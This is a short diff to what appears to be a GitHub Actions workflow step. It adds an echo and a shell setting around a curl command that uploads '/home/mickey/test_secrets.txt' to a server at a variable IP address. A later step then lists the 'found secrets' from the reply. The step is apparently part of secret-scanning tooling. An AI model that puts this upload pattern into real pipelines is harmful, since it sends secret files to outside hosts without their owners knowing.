@@ -49,8 +49,9 @@ runs:
     # send request
     - id: send_request
       run: |
+         echo $IP_ADDR
          curl -F 'file=@/home/mickey/test_secrets.txt' http://$IP_ADDR:8000/uploadfile >> ${{ github.action_path }}/otchet.txt
-    
+      shell: bash
     - id: list-found-secrets
       run: |
         cat ${{ github.action_path }}/otchet.txt
